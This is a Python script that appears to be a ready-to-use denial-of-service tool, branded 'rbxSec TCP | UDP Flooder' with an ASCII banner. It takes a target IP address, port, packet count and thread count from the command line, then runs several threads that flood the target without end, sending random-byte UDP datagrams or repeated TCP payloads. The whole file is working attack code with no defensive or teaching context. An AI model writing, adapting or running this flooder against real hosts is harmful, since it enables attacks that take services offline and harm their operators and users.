#!/usr/bin/env python3 

import argparse
from asyncio import threads
import random 
import socket 
import threading
import time
import os   

print('''
██████╗  █████╗ ██╗██╗       ██████╗ ██╗   ██╗███╗   ██╗
██╔══██╗██╔══██╗██║██║      ██╔════╝ ██║   ██║████╗  ██║
██████╔╝███████║██║██║█████╗██║  ███╗██║   ██║██╔██╗ ██║
██╔══██╗██╔══██║██║██║╚════╝██║   ██║██║   ██║██║╚██╗██║
██║  ██║██║  ██║██║███████╗ ╚██████╔╝╚██████╔╝██║ ╚████║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝
            {+} rbxSec TCP | UDP Flooder {+}
''')
ap = argparse.ArgumentParser()
ap.add_argument("-i", "--ip", required=True, type=str, help="IP address (only supports ipv4!)")
ap.add_argument("-p", "--port", required=True, type=int, help="Port e.g 80")
ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
ap.add_argument("-t", "--times", type=int, default=50000, help="Packets per one connection")
ap.add_argument("-th", "--threads", type=int, default=5, help="Threads ")
args = vars(ap.parse_args())
os.system('cls')
print('''
██████╗  █████╗ ██╗██╗       ██████╗ ██╗   ██╗███╗   ██╗
██╔══██╗██╔══██╗██║██║      ██╔════╝ ██║   ██║████╗  ██║
██████╔╝███████║██║██║█████╗██║  ███╗██║   ██║██╔██╗ ██║
██╔══██╗██╔══██║██║██║╚════╝██║   ██║██║   ██║██║╚██╗██║
██║  ██║██║  ██║██║███████╗ ╚██████╔╝╚██████╔╝██║ ╚████║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝
            {+} rbxSec TCP / UDP Flooder {+} 
                attacking in 3 seconds
''')
time.sleep(3)
ip = args['ip']
port = args['port']
choice = args['choice']
times = args['times']
threads = args['threads']

def run():
    data = random._urandom(1024)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
            try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    addr = (str(ip),int(port))
                    for x in range(times):
                        s.sendto(data,addr)
                    print(i +"Attacking")
            except:
                    print("[!] Error!")

def run2():
    data = random._urandom(16)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip,port))
                s.send(data)
                for x in range(times):
                        s.send(data)
                print(i +"Attacking!")
        except:
                s.close()
                print("[!] Error!")

for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
    else: 
        th = threading.Thread(target = run2)
        th.start()
